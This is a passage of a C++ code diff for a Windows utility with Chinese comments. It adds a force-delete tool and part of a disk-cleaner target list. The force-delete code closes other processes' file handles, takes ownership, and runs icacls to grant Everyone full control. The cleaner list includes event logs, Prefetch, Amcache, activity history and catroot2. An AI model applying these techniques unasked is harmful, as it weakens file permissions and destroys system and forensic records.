+        if (!hTargetProcess) {
+            processedPids.push_back(handle.ProcessId);
+            continue;
+        }
+
+        processedPids.push_back(handle.ProcessId);
+
+        HANDLE hLocalHandle = NULL;
+        if (DuplicateHandle(hTargetProcess, (HANDLE)(ULONG_PTR)handle.Handle,
+            GetCurrentProcess(), &hLocalHandle, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
+
+            if (GetFileType(hLocalHandle) == FILE_TYPE_DISK) {
+                std::vector<wchar_t> pathBuffer(MAX_PATH * 4);
+                DWORD pathLen = GetFinalPathNameByHandleW(hLocalHandle, pathBuffer.data(), static_cast<DWORD>(pathBuffer.size()), VOLUME_NAME_DOS);
+                if (pathLen > 0 && pathLen < MAX_PATH * 4) {
+                    std::wstring currentPath = pathBuffer.data();
+                    if (currentPath.find(targetPath) != std::wstring::npos) {
+                        HANDLE hDupForClose = NULL;
+                        if (DuplicateHandle(hTargetProcess, (HANDLE)(ULONG_PTR)handle.Handle,
+                            GetCurrentProcess(), &hDupForClose, 0, FALSE, DUPLICATE_CLOSE_SOURCE)) {
+                            CloseHandle(hDupForClose);
+                        }
+                        else {
+                            allClosed = false;
+                        }
+                    }
+                }
+            }
+            CloseHandle(hLocalHandle);
+        }
+        CloseHandle(hTargetProcess);
+    }
+
+    return allClosed;
+}
+
+bool TakeOwnershipAndDeleteMaliciousFile(const std::wstring& filePath) {
+    EnablePrivilege(SE_TAKE_OWNERSHIP_NAME);
+    EnablePrivilege(SE_RESTORE_NAME);
+    EnablePrivilege(SE_BACKUP_NAME);
+    EnablePrivilege(SE_SECURITY_NAME);
+    EnablePrivilege(SE_DEBUG_NAME);
+
+    PSID pOwnerSid = nullptr;
+    HANDLE hToken = NULL;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
+        DWORD size = 0;
+        GetTokenInformation(hToken, TokenUser, nullptr, 0, &size);
+        std::vector<BYTE> tokenBuffer(size);
+        PTOKEN_USER pTokenUser = reinterpret_cast<PTOKEN_USER>(tokenBuffer.data());
+        if (GetTokenInformation(hToken, TokenUser, pTokenUser, size, &size)) {
+            pOwnerSid = pTokenUser->User.Sid;
+        }
+        CloseHandle(hToken);
+    }
+    if (!pOwnerSid) return false;
+
+    DWORD attrs = GetFileAttributesW(filePath.c_str());
+    if (attrs == INVALID_FILE_ATTRIBUTES) return true;
+
+    if (attrs & FILE_ATTRIBUTE_DIRECTORY) {
+        std::wstring searchPath = filePath + L"\\*";
+        WIN32_FIND_DATAW findData;
+        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
+        if (hFind != INVALID_HANDLE_VALUE) {
+            std::vector<std::wstring> subPaths;
+            do {
+                if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0)
+                    continue;
+                subPaths.push_back(filePath + L"\\" + findData.cFileName);
+            } while (FindNextFileW(hFind, &findData));
+            FindClose(hFind);
+
+            for (const auto& subPath : subPaths) {
+                TakeOwnershipAndDeleteMaliciousFile(subPath);
+            }
+        }
+    }
+
+    SetFileAttributesW(filePath.c_str(), FILE_ATTRIBUTE_NORMAL);
+
+    EXPLICIT_ACCESSW ea[3] = { 0 };
+    ea[0].grfAccessPermissions = 0x10000000;
+    ea[0].grfAccessMode = GRANT_ACCESS;
+    ea[0].grfInheritance = NO_INHERITANCE;
+    ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
+    ea[0].Trustee.TrusteeType = TRUSTEE_IS_USER;
+    ea[0].Trustee.ptstrName = (LPWSTR)pOwnerSid;
+
+    ea[1].grfAccessPermissions = 0x10000000;
+    ea[1].grfAccessMode = GRANT_ACCESS;
+    ea[1].grfInheritance = NO_INHERITANCE;
+    ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
+    ea[1].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
+    ea[1].Trustee.ptstrName = (LPWSTR)WinBuiltinAdministratorsSid;
+
+    ea[2].grfAccessPermissions = 0x10000000;
+    ea[2].grfAccessMode = GRANT_ACCESS;
+    ea[2].grfInheritance = NO_INHERITANCE;
+    ea[2].Trustee.TrusteeForm = TRUSTEE_IS_SID;
+    ea[2].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
+    ea[2].Trustee.ptstrName = (LPWSTR)WinBuiltinUsersSid;
+
+    PACL pDacl = nullptr;
+    DWORD result = SetEntriesInAclW(3, ea, nullptr, &pDacl);
+    if (result == ERROR_SUCCESS) {
+        SetNamedSecurityInfoW(const_cast<wchar_t*>(filePath.c_str()), SE_FILE_OBJECT,
+            OWNER_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
+            pOwnerSid, nullptr, pDacl, nullptr);
+        LocalFree(pDacl);
+    }
+    else {
+        SetNamedSecurityInfoW(const_cast<wchar_t*>(filePath.c_str()), SE_FILE_OBJECT,
+            OWNER_SECURITY_INFORMATION,
+            pOwnerSid, nullptr, nullptr, nullptr);
+    }
+
+    SetFileAttributesW(filePath.c_str(), FILE_ATTRIBUTE_NORMAL);
+
+    if (attrs & FILE_ATTRIBUTE_DIRECTORY) {
+        return RemoveDirectoryW(filePath.c_str()) != 0 || GetLastError() == ERROR_FILE_NOT_FOUND;
+    }
+
+    HANDLE hFile = CreateFileW(filePath.c_str(), DELETE | GENERIC_WRITE,
+        FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE,
+        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (hFile != INVALID_HANDLE_VALUE) {
+        // [v5.3 跨版本兼容] FileDispositionInfoEx (Win10 1607+) 带 POSIX 语义
+        //   Win7 polyfill 提供类型, Win7 内核不识别自动失败回退
+        FILE_DISPOSITION_INFO_EX dispositionInfo = { FILE_DISPOSITION_FLAG_DELETE | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS };
+        BOOL delResult = SetFileInformationByHandle(hFile, FileDispositionInfoEx, &dispositionInfo, sizeof(dispositionInfo));
+        if (!delResult) {
+            // 回退到 Win7 兼容的 FileDispositionInfo
+            FILE_DISPOSITION_INFO fbInfo = { TRUE };
+            delResult = SetFileInformationByHandle(hFile, FileDispositionInfo, &fbInfo, sizeof(fbInfo));
+        }
+        CloseHandle(hFile);
+        return delResult || GetLastError() == ERROR_FILE_NOT_FOUND;
+    }
+
+    return DeleteFileW(filePath.c_str()) != 0 || GetLastError() == ERROR_FILE_NOT_FOUND;
+}
+
+bool UseIcaclsReset(const std::wstring& path) {
+    std::wstring cmd;
+
+    cmd = L"takeown /f \"" + path + L"\" /r /d y";
+    _wsystem(cmd.c_str());
+    Sleep(500);
+
+    cmd = L"icacls \"" + path + L"\" /reset /T /C /Q";
+    _wsystem(cmd.c_str());
+    Sleep(300);
+
+    cmd = L"icacls \"" + path + L"\" /grant Everyone:F /T /C /Q";
+    _wsystem(cmd.c_str());
+    Sleep(300);
+
+    cmd = L"icacls \"" + path + L"\" /grant Administrators:F /T /C /Q";
+    _wsystem(cmd.c_str());
+    Sleep(1000);
+
+    if (ForceDeletePathInternal(path)) {
+        return true;
+    }
+
+    for (int i = 0; i < 2; i++) {
+        Sleep(200);
+        if (ForceDeletePathInternal(path)) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+bool UseMoveFileEx(const std::wstring& path) {
+    wchar_t tempPath[MAX_PATH];
+    GetTempPathW(MAX_PATH, tempPath);
+    std::wstring newPath = std::wstring(tempPath) + L"to_delete_" + std::to_wstring(GetTickCount());
+
+    if (MoveFileExW(path.c_str(), newPath.c_str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
+        Sleep(100);
+        return DeleteFileW(newPath.c_str()) != 0 || GetLastError() == ERROR_FILE_NOT_FOUND;
+    }
+    return false;
+}
+
+bool DeleteFileWithHandleRelease(const std::wstring& path) {
+    if (ForceDeletePathInternal(path)) {
+        return true;
+    }
+
+    if (ForceDeletePath(path)) {
+        return true;
+    }
+
+    if (UseIcaclsReset(path)) {
+        return true;
+    }
+
+    if (UseIcaclsReset(path)) {
+        return true;
+    }
+
+    return UseMoveFileEx(path);
+}
+
+bool ForceDelete(const std::wstring& path) {
+    return DeleteFileWithHandleRelease(path);
+}
+// 文件选择对话框结果枚举
+enum class FileDialogResult {
+    SUCCESS,    // 成功选择文件
+    CANCELLED,  // 用户取消
+    ERROR_      // 发生错误
+};
+
+// 弹出文件选择对话框 - 适合在switch中使用
+FileDialogResult ShowFileSelectionDialog(std::wstring& selectedPath) {
+    // 初始化COM库
+    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
+    if (FAILED(hr)) {
+        std::wcout << L"COM初始化失败: " << hr << std::endl;
+        return FileDialogResult::ERROR_;
+    }
+
+    // 使用智能指针管理COM接口
+    IFileOpenDialog* pFileOpen = NULL;
+
+    // 创建文件打开对话框
+    hr = CoCreateInstance(CLSID_FileOpenDialog, NULL, CLSCTX_ALL,
+        IID_IFileOpenDialog, reinterpret_cast<void**>(&pFileOpen));
+
+    if (SUCCEEDED(hr)) {
+        // 设置选项 - 允许选择文件和文件夹
+        DWORD options;
+        pFileOpen->GetOptions(&options);
+        pFileOpen->SetOptions(options | FOS_PATHMUSTEXIST | FOS_FILEMUSTEXIST | FOS_FORCEFILESYSTEM | FOS_PICKFOLDERS);
+
+        // 设置标题
+        pFileOpen->SetTitle(L"选择要强制删除的文件或文件夹");
+
+        // 显示对话框
+        hr = pFileOpen->Show(NULL);
+
+        if (SUCCEEDED(hr)) {
+            // 获取选择结果
+            IShellItem* pItem;
+            hr = pFileOpen->GetResult(&pItem);
+
+            if (SUCCEEDED(hr)) {
+                PWSTR pszFilePath;
+                hr = pItem->GetDisplayName(SIGDN_FILESYSPATH, &pszFilePath);
+
+                if (SUCCEEDED(hr)) {
+                    selectedPath = pszFilePath;
+                    CoTaskMemFree(pszFilePath);
+                }
+                pItem->Release();
+
+                CoUninitialize();
+                return FileDialogResult::SUCCESS;
+            }
+        }
+        else if (hr == HRESULT_FROM_WIN32(ERROR_CANCELLED)) {
+            CoUninitialize();
+            return FileDialogResult::CANCELLED;
+        }
+        pFileOpen->Release();
+    }
+
+    CoUninitialize();
+    return FileDialogResult::ERROR_;
+}
+void del() {
+    DMSP_VERIFY(0x2003);  // 强力删除子函数 - 二级验证
+    std::wcout << L"[信息] 请选择要删除的文件或文件夹" << std::endl;
+    std::wcout << L"提示: 按ESC或取消可跳过自定义删除" << std::endl;
+
+    int deletedCount = 0;
+    bool continueSelecting = true;
+
+    while (continueSelecting) {
+        std::wstring selectedPath;
+        FileDialogResult result = ShowFileSelectionDialog(selectedPath);
+
+        if (result == FileDialogResult::SUCCESS && !selectedPath.empty()) {
+            std::wcout << L"已选择: " << selectedPath << std::endl;
+            std::wcout << L"正在执行删除..." << std::endl;
+
+            DWORD startTime = GetTickCount();
+            const DWORD timeout = 600;
+            bool deleteSuccess = false;
+
+            while (GetTickCount() - startTime < timeout) {
+                if (ForceDelete(selectedPath)) {
+                    deleteSuccess = true;
+                    break;
+                }
+
+                DWORD error = GetLastError();
+                if (error == ERROR_FILE_NOT_FOUND) {
+                    deleteSuccess = true;
+                    break;
+                }
+
+                DWORD elapsed = GetTickCount() - startTime;
+                if (elapsed >= timeout) {
+                    break;
+                }
+
+                Sleep(2);
+            }
+
+            if (deleteSuccess) {
+                std::wcout << L"[完成] 已删除: " << selectedPath << std::endl;
+                deletedCount++;
+            } else {
+                std::wcout << L"[失败] 无法删除: " << selectedPath << std::endl;
+            }
+
+            std::wcout << L"是否继续选择更多文件或文件夹? (Y/N): ";
+            wchar_t choice;
+            std::wcin >> choice;
+            std::wcin.ignore();
+            if (choice != L'y' && choice != L'Y') {
+                continueSelecting = false;
+            }
+        }
+        else if (result == FileDialogResult::CANCELLED) {
+            std::wcout << L"已取消选择" << std::endl;
+            continueSelecting = false;
+        }
+        else {
+            std::wcout << L"选择失败或无效路径" << std::endl;
+            continueSelecting = false;
+        }
+    }
+
+    if (deletedCount > 0) {
+        std::wcout << L"[统计] 共删除了 " << deletedCount << L" 个项目" << std::endl;
+    }
+
+    std::wcout << L"[完成] 删除操作完成" << std::endl;
+}
+
+// ============================================================================
+// 垃圾清理模块 - 多线程C盘垃圾文件扫描与清理
+// ============================================================================
+
+class GarbageCleaner {
+public:
+    struct GarbageFileInfo {
+        std::wstring path;
+        uint64_t size;
+        std::wstring category;
+        std::wstring description;
+    };
+
+    struct ScanProgress {
+        std::atomic<uint64_t> scannedFiles{0};
+        std::atomic<uint64_t> foundFiles{0};
+        std::atomic<uint64_t> totalSize{0};
+        std::atomic<int> runningThreads{0};
+        std::chrono::steady_clock::time_point startTime;
+    };
+
+private:
+    static ScanProgress g_progress;
+    static std::vector<GarbageFileInfo> g_garbageFiles;
+    static std::mutex g_mutex;
+    static std::atomic<bool> g_stopRequested;
+
+    struct ScanTarget {
+        std::wstring path;
+        std::wstring category;
+        std::wstring description;
+        std::vector<std::wstring> extensions;
+        bool scanSubdirs;
+        int maxDepth;
+    };
+
+    static std::vector<ScanTarget> GetScanTargets() {
+        wchar_t userProfile[MAX_PATH] = L"C:\\Users\\Default";
+        wchar_t localAppData[MAX_PATH] = L"";
+        wchar_t appData[MAX_PATH] = L"";
+        wchar_t tempPath[MAX_PATH] = L"C:\\Windows\\Temp";
+
+        GetEnvironmentVariableW(L"USERPROFILE", userProfile, MAX_PATH);
+        GetEnvironmentVariableW(L"LOCALAPPDATA", localAppData, MAX_PATH);
+        GetEnvironmentVariableW(L"APPDATA", appData, MAX_PATH);
+        GetTempPathW(MAX_PATH, tempPath);
+
+        std::vector<ScanTarget> targets;
+
+        if (tempPath[0] != L'\0') {
+            targets.push_back({tempPath, L"系统临时文件", L"Windows临时文件夹", {L".tmp", L".temp", L"~"}, true, 3});
+        }
+        targets.push_back({L"C:\\Windows\\Temp", L"Windows临时文件", L"Windows系统临时文件夹", {L".tmp", L".temp"}, true, 2});
+        if (localAppData[0] != L'\0') {
+            targets.push_back({std::wstring(localAppData) + L"\\Temp", L"用户临时文件", L"用户临时文件夹", {L".tmp", L".temp"}, true, 3});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\INetCache", L"浏览器缓存", L"Internet临时缓存", {L"*"}, true, 5});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\IEDownloads", L"浏览器下载", L"IE下载文件夹", {L"*"}, true, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Edge\\User Data\\Default\\Cache", L"Edge缓存", L"Edge浏览器缓存", {L"*"}, true, 3});
+            targets.push_back({std::wstring(localAppData) + L"\\Google\\Chrome\\User Data\\Default\\Cache", L"Chrome缓存", L"Chrome浏览器缓存", {L"*"}, true, 3});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\Explorer", L"缩略图缓存", L"Windows缩略图缓存", {L"thumbcache_*.db"}, false, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\CrashDumps", L"崩溃转储", L"程序崩溃转储文件", {L"*.dmp"}, false, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\D3DSCache", L"DirectX缓存", L"Direct3D着色器缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Packages", L"UWP缓存", L"UWP应用缓存", {L"*"}, true, 2});
+        }
+        if (appData[0] != L'\0') {
+            targets.push_back({std::wstring(appData) + L"\\Microsoft\\Windows\\Recent", L"最近使用记录", L"最近打开文件记录", {L"*"}, false, 1});
+        }
+        if (userProfile[0] != L'\0') {
+            targets.push_back({std::wstring(userProfile) + L"\\Downloads", L"下载文件夹旧文件", L"下载文件夹中的临时文件", {L".tmp", L".temp", L".partial"}, false, 1});
+        }
+        targets.push_back({L"C:\\Windows\\Prefetch", L"预读取文件", L"Windows预读取文件", {L"*.pf"}, false, 1});
+        targets.push_back({L"C:\\Windows\\Logs", L"系统日志", L"Windows日志文件", {L"*.log", L"*.etl"}, true, 3});
+        targets.push_back({L"C:\\$WinREAgent", L"WinRE缓存", L"Windows恢复环境缓存", {L"*"}, true, 2});
+
+        wchar_t commonAppData[MAX_PATH] = L"";
+        GetEnvironmentVariableW(L"ALLUSERSPROFILE", commonAppData, MAX_PATH);
+        if (commonAppData[0] != L'\0') {
+            targets.push_back({std::wstring(commonAppData) + L"\\Microsoft\\Windows\\WER", L"错误报告", L"Windows错误报告", {L"*"}, true, 2});
+        }
+        targets.push_back({L"C:\\inetpub\\logs\\LogFiles", L"IIS日志", L"Internet Information Services日志", {L"*"}, true, 3});
+        if (localAppData[0] != L'\0') {
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Edge\\User Data\\Default\\Code Cache", L"Edge代码缓存", L"Edge浏览器代码缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Edge\\User Data\\Default\\GPUCache", L"Edge GPU缓存", L"Edge浏览器GPU缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Edge\\User Data\\ShaderCache", L"Edge着色器缓存", L"Edge浏览器着色器缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Edge\\Application\\Cache", L"Edge应用缓存", L"Edge应用程序缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\EdgeUpdate", L"Edge更新缓存", L"Edge浏览器更新缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\INetCookies", L"Cookie缓存", L"Internet Cookie缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\ActionCenterCache", L"操作中心缓存", L"Windows操作中心缓存", {L"*"}, true, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\Themes\\CachedImages", L"主题缓存", L"Windows主题缓存图片", {L"*"}, true, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\Notifications", L"通知缓存", L"Windows通知缓存", {L"*"}, true, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\Activity", L"活动历史记录", L"Windows活动时间线历史", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\History", L"Edge历史记录", L"Edge浏览器访问历史", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\WebCache", L"WebCache数据库", L"Internet Explorer WebCache数据库", {L"*.dat"}, false, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\RetailDemo", L"零售演示内容", L"Windows零售演示内容缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\GameTrayIcons", L"游戏图标缓存", L"Windows游戏栏图标缓存", {L"*"}, true, 1});
+        }
+        if (appData[0] != L'\0') {
+            targets.push_back({std::wstring(appData) + L"\\Microsoft\\Windows\\Cookies", L"Cookie文件", L"浏览器Cookie", {L"*"}, false, 1});
+            targets.push_back({std::wstring(appData) + L"\\Microsoft\\Windows\\Recent\\AutomaticDestinations", L"跳转列表缓存", L"任务栏跳转列表自动跳转缓存", {L"*"}, false, 1});
+            targets.push_back({std::wstring(appData) + L"\\Microsoft\\Windows\\Recent\\CustomDestinations", L"跳转列表缓存", L"任务栏跳转列表自定义跳转缓存", {L"*"}, false, 1});
+        }
+        targets.push_back({L"C:\\Windows\\System32\\LogFiles", L"系统日志文件", L"Windows系统日志文件", {L"*"}, true, 2});
+        targets.push_back({L"C:\\Windows\\Panther", L"安装日志", L"Windows安装日志", {L"*.log", L"*.xml"}, true, 2});
+        targets.push_back({L"C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Windows\\DFS", L"DFS缓存", L"分布式文件系统缓存", {L"*"}, true, 2});
+        targets.push_back({L"C:\\Windows\\System32\\winevt\\Logs", L"事件日志备份", L"Windows事件日志备份文件", {L"*.evtx"}, false, 1});
+        targets.push_back({L"C:\\Windows\\Downloaded Program Files", L"已下载程序文件", L"Windows已下载的程序文件", {L"*"}, false, 1});
+        targets.push_back({L"C:\\Windows\\SoftwareDistribution\\Download", L"Windows更新缓存", L"Windows更新下载缓存", {L"*"}, true, 3});
+        targets.push_back({L"C:\\Windows\\WinSxS\\Backup", L"WinSxS备份", L"Windows组件备份", {L"*"}, false, 1});
+        // 注意: WinSxS主目录绝对不能清理！仅清理其下的Temp子目录(真正的临时文件)
+        targets.push_back({L"C:\\Windows\\WinSxS\\Temp", L"WinSxS临时文件", L"WinSxS组件存储临时目录(非组件本身)", {L"*"}, false, 1});
+        targets.push_back({L"C:\\Windows\\Panther\\UnattendGC", L"应答文件缓存", L"Windows安装应答文件", {L"*"}, false, 1});
+        targets.push_back({L"C:\\Windows\\System32\\CodeStore", L"代码存储缓存", L"Windows代码存储缓存", {L"*"}, false, 1});
+        targets.push_back({L"C:\\Windows\\System32\\catroot2", L"签名缓存", L"Windows证书签名缓存", {L"*"}, true, 1});
+        targets.push_back({L"C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Temp", L"系统临时文件", L"系统用户临时文件夹", {L"*"}, true, 3});
+
+        if (localAppData[0] != L'\0') {
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Edge\\User Data\\Default\\Network\\Cache", L"Edge网络缓存", L"Edge浏览器网络缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Edge\\User Data\\Default\\Sessions", L"Edge会话缓存", L"Edge浏览器会话数据", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Edge\\User Data\\Default\\Session Storage", L"Edge会话存储", L"Edge浏览器会话存储", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Google\\Chrome\\User Data\\Default\\Code Cache", L"Chrome代码缓存", L"Chrome浏览器代码缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Google\\Chrome\\User Data\\Default\\GPUCache", L"Chrome GPU缓存", L"Chrome浏览器GPU缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Google\\Chrome\\User Data\\Default\\ShaderCache", L"Chrome着色器缓存", L"Chrome浏览器着色器缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Google\\Chrome\\User Data\\Default\\Session Storage", L"Chrome会话存储", L"Chrome浏览器会话存储", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Edge\\User Data\\Default\\Local Storage", L"Chrome本地存储", L"Chrome浏览器本地存储", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Google\\Chrome\\User Data\\Default\\ShaderCache", L"Chrome全局着色器", L"Chrome浏览器着色器缓存", {L"*"}, true, 2});
+            // Edge/Chrome 深层Web应用缓存(网页应用/PWA数据，可占数GB)
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Edge\\User Data\\Default\\blob_storage", L"Edge Blob存储", L"Edge浏览器二进制大对象存储(PWA/网页应用)", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage", L"Edge SW缓存", L"Edge Service Worker缓存存储(PWA离线数据)", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Edge\\User Data\\Default\\databases", L"Edge Web数据库", L"Edge浏览器Web数据库(IndexedDB/WebSQL)", {L"*"}, false, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\Google\\Chrome\\User Data\\Default\\blob_storage", L"Chrome Blob存储", L"Chrome浏览器二进制大对象存储(PWA/网页应用)", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Google\\Chrome\\User Data\\Default\\Service Worker\\CacheStorage", L"Chrome SW缓存", L"Chrome Service Worker缓存存储(PWA离线数据)", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Google\\Chrome\\User Data\\Default\\databases", L"Chrome Web数据库", L"Chrome浏览器Web数据库(IndexedDB/WebSQL)", {L"*"}, false, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\Mozilla\\Firefox\\Profiles", L"Firefox缓存(仅缓存)", L"Mozilla Firefox浏览器缓存(保留书签/密码/偏好设置)", {L"cache*", L"*.cache", L"*.cache2", L"*.tmp", L"telemetry*", L"healthreport"}, true, 3});
+            targets.push_back({std::wstring(localAppData) + L"\\Opera Software\\Opera Stable\\Cache", L"Opera缓存", L"Opera浏览器缓存", {L"*"}, true, 3});
+            targets.push_back({std::wstring(localAppData) + L"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cache", L"Brave缓存", L"Brave浏览器缓存", {L"*"}, true, 3});
+            targets.push_back({std::wstring(localAppData) + L"\\Vivaldi\\User Data\\Default\\Cache", L"Vivaldi缓存", L"Vivaldi浏览器缓存", {L"*"}, true, 3});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\Explorer\\IconCacheToDelete", L"图标缓存删除", L"待删除的图标缓存", {L"*"}, false, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\InputPersonalization", L"输入学习数据", L"微软输入学习数据", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\InputPersonalization\\Textures", L"输入纹理缓存", L"微软输入纹理缓存", {L"*"}, true, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\Feedback\\Da", L"反馈数据", L"Windows反馈数据", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\SettingSync", L"设置同步缓存", L"Windows设置同步缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\Explorer\\Amcache", L"Amcache缓存", L"程序兼容客户端缓存", {L"Amcache.hve"}, false, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\Explorer\\ThumbnailsToDelete", L"缩略图删除", L"待删除的缩略图", {L"*"}, false, 1});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\Temporary Internet Files", L"IE临时文件", L"Internet Explorer临时文件", {L"*"}, true, 3});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\INetCache\\Content.IE5", L"IE5缓存", L"Internet Explorer 5缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\INetCache\\Content.IE6", L"IE6缓存", L"Internet Explorer 6缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\INetCache\\Content.IE7", L"IE7缓存", L"Internet Explorer 7缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\INetCache\\Content.IE8", L"IE8缓存", L"Internet Explorer 8缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\WER\\ReportArchive", L"错误报告归档", L"Windows错误报告归档", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\WER\\ReportQueue", L"错误报告队列", L"Windows错误报告队列", {L"*"}, true, 2});
+            targets.push_back({std::wstring(localAppData) + L"\\Microsoft\\Windows\\TAP", L"TAP驱动缓存", L"TAP网络驱动缓存", {L"*"}, true, 1});
+        }
+        if (appData[0] != L'\0') {
+            targets.push_back({std::wstring(appData) + L"\\Microsoft\\Windows\\Explorer\\", L"跳转列表", L"任务栏跳转列表", {L"*"}, false, 1});
+            targets.push_back({std::wstring(appData) + L"\\Microsoft\\Windows\\Notifications\\PlatStore", L"通知存储", L"Windows通知存储", {L"*"}, false, 1});
+        }
+        if (userProfile[0] != L'\0') {
+            targets.push_back({std::wstring(userProfile) + L"\\AppData\\Local\\Spotify\\Data", L"Spotify缓存(仅临时)", L"Spotify音乐临时缓存(保留离线音乐/登录状态)", {L"*.cache", L"*.tmp", L"*.log"}, false, 1});
+            targets.push_back({std::wstring(userProfile) + L"\\AppData\\Local\\Discord\\Cache", L"Discord缓存", L"Discord缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(userProfile) + L"\\AppData\\Local\\Discord\\Code Cache", L"Discord代码缓存", L"Discord代码缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(userProfile) + L"\\AppData\\Local\\Discord\\GPUCache", L"Discord GPU缓存", L"Discord GPU缓存", {L"*"}, true, 1});
+            targets.push_back({std::wstring(userProfile) + L"\\AppData\\Local\\Discord\\databases", L"Discord数据库缓存", L"Discord数据库缓存(可重建)", {L"*.db", L"*.db-journal", L"*.db-wal"}, false, 1});
+            targets.push_back({std::wstring(userProfile) + L"\\AppData\\Local\\Slack\\Cache", L"Slack缓存", L"Slack缓存", {L"*"}, true, 2});
+            targets.push_back({std::wstring(userProfile) + L"\\AppData\\Local\\Slack\\Code Cache", L"Slack代码缓存", L"Slack代码缓存", {L"*"}, true, 1});
+            targets.push_back({std::wstring(userProfile) + L"\\AppData\\Local\\Slack\\GPUCache", L"Slack GPU缓存", L"Slack GPU缓存", {L"*"}, true, 1});
+            targets.push_back({std::wstring(userProfile) + L"\\AppData\\Local\\Slack\\databases", L"Slack数据库缓存", L"Slack数据库缓存(可重建)", {L"*.db", L"*.db-journal"}, false, 1});
